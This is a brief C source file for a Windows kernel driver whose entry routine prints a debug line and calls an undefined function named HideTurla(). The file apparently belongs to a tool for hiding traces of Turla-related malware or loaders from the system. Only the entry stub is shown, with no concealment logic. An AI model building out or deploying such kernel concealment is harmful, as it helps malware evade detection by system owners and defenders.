#include "Driver.h"

/// <summary>
/// Defines the entry point of the driver.
/// </summary>
/// <param name="_DriverObject">The driver object.</param>
/// <param name="_RegistryPath">The registry path.</param>
NTSTATUS DriverEntry(PDRIVER_OBJECT _DriverObject, PUNICODE_STRING _RegistryPath)
{
    DbgPrintEx(0, 0, "[DriverExample] Executing " __FUNCTION__ ".\n");

    UNREFERENCED_PARAMETER(_DriverObject);
    UNREFERENCED_PARAMETER(_RegistryPath);

    NTSTATUS        Status;

    if (!NT_SUCCESS(Status = HideTurla()))
    {
        DbgPrintEx(0, 0, "[DriverExample] Failed to HideTurla().\n");
        return Status;
    }

    return STATUS_SUCCESS;
}